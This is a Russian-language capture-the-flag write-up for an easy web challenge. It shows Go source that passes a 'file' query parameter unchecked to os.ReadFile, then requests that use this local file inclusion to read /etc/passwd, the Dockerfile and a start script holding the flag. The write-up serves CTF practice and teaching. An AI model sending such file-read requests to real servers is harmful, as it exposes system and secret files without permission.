#web #easy

**Задание:** 

А правда что калькулятор выполняет базовые математические функции?

IP: 62.173.140.174:16105

---
**Решение (уязвимость – LFI):**

Имеем страницу со следующим содержимым:

![[Pasted image 20260107001755.png]]

Смотрим исходный код приложения и находим уязвимость:

```js
param := string([]byte{102, 105, 108, 101}) // "file"
reqFile := r.URL.Query().Get(string(append(
    []byte{}, 
    byte(param[0]), 
    byte(param[1]), 
    byte(param[2]), 
    byte(param[3]),
))) // Получаем параметр "file"

content, err := os.ReadFile(reqFile)
```

Имеем:

- Параметр `file` передается напрямую в `os.ReadFile()`.
- Нет проверки на `../` или другие опасные последовательности.
- Только минимальная фильтрация пробельных символов.

Проверка уязвимости (http://62.173.140.174:16105/source?file=/etc/passwd):

```text
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

Находим файл Dockerfile – http://62.173.140.174:16105/source?file=./Dockerfile:

```text
FROM golang:1.21-alpine

WORKDIR /app

COPY . .

RUN go mod init ctf-app && \
    go mod tidy

EXPOSE 8080

CMD ["/bin/sh", "start.sh"]
```

По умолчанию при запуске контейнера выполняется команда из `CMD`, посмотрим содержимое файла `start.sh` – http://62.173.140.174:16105/source?file=/app/start.sh:

```sh
#!/bin/sh
export FLAG="CODEBY{C4LCUL470R_PR0V3D_70_B3_UNS4F3}"
go run main.go
```

Флаг также можно было получить из переменных окружения процесса – http://62.173.140.174:16105/source?file=/app/start.sh.

**Флаг:** CODEBY{C4LCUL470R_PR0V3D_70_B3_UNS4F3}